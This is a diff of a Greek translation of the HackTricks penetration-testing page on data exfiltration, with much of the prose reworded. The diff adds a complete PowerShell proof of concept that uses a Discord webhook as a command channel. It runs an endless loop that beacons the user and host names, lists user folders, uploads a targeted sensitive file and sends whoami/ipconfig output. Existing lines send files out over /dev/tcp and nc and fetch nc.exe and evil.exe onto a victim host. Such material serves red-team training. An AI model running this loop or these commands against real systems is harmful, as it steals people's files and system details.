@@ -1,12 +1,12 @@
-# Εξαγωγή
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Συνήθεις τομείς που έχουν επιτραπεί για την εξαγωγή πληροφοριών
+## Commonly whitelisted domains to exfiltrate information
 
-Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθεις τομείς που μπορούν να καταχραστούν
+Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνηθισμένους whitelisted domains που μπορούν να χρησιμοποιηθούν κακόβουλα
 
-## Αντιγραφή\&Επικόλληση Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -42,11 +42,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Αποστολή αρχείων
+### Μεταφόρτωση αρχείων
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
+- Μονάδα Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -100,9 +100,94 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Τα Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά file parts. Συχνά επιτρέπονται προς αξιόπιστα SaaS domains και δεν απαιτούν OAuth/API keys, καθιστώντας τα χρήσιμα για low-friction beaconing και exfiltration.
+
+Key ideas:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Σημειώσεις:
+- Παρόμοια μοτίβα ισχύουν για άλλες πλατφόρμες συνεργασίας (Slack/Teams) που χρησιμοποιούν incoming webhooks· προσαρμόστε το URL και το JSON schema ανάλογα.
+- Για DFIR των artifacts της cache του Discord Desktop και ανάκτηση webhook/API, δείτε:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTP server (python)
+### FTP διακομιστής (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -112,7 +197,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP server (pure-ftp)
+### FTP διακομιστής (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -143,14 +228,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali ως διακομιστής
+Kali ως server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ή δημιουργήστε ένα smb share **using samba**:
+Ή δημιούργησε ένα smb share **χρησιμοποιώντας samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Ο επιτιθέμενος πρέπει να έχει το SSHd σε λειτουργία.
+Ο επιτιθέμενος πρέπει να έχει SSHd ενεργό.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Αν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να προσαρτήσει έναν φάκελο από το θύμα στον επιτιθέμενο.
+Εάν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να mount έναν κατάλογο από το θύμα στον επιτιθέμενο.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,19 +279,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Κατέβασμα αρχείου από το θύμα
+### Κατέβασμα αρχείου από victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Αποστολή αρχείου στον θύμα
+### Μεταφόρτωση αρχείου στο θύμα
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-ευχαριστώ τον **@BinaryShadow\_**
+ευχαριστίες σε **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,15 +313,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Αν μπορείτε να στείλετε δεδομένα σε έναν SMTP server, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με python:
+Εάν μπορείτε να στείλετε δεδομένα σε έναν SMTP server, μπορείτε να δημιουργήσετε έναν SMTP για να λαμβάνετε τα δεδομένα με python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Κατά προεπιλογή σε XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)
+Ενεργό από προεπιλογή στα XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)
 
-Στο Kali, **ξεκινήστε τον διακομιστή TFTP**:
+Στο Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -248,13 +333,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Στο **θύμα**, συνδεθείτε με τον διακομιστή Kali:
+Στο **victim**, συνδεθείτε στον Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατεβάστε ένα αρχείο με ένα PHP oneliner:
+Κατέβασε ένα αρχείο με PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση δυαδικών αρχείων αλλά έχει επίσης τη **δυνατότητα να τα ξαναχτίσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός δυαδικού αρχείου, το `debug.exe` μπορεί να δημιουργήσει το δυαδικό αρχείο. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει μια **περιορισμένη δυνατότητα συναρμολόγησης αρχείων έως 64 kb σε μέγεθος**.
+Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των binaries αλλά έχει επίσης την **ικανότητα να τα ανακατασκευάζει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός binary, `debug.exe` μπορεί να δημιουργήσει το binary file. Ωστόσο, είναι σημαντικό να σημειωθεί ότι debug.exe έχει **περιορισμό στο να συναρμολογεί αρχεία μέχρι 64 kb σε μέγεθος**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Στη συνέχεια, επικολλήστε το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο με όνομα nc.exe.
+Στη συνέχεια κάντε αντιγραφή-επικόλληση του κειμένου στο windows-shell και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Αναφορές
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
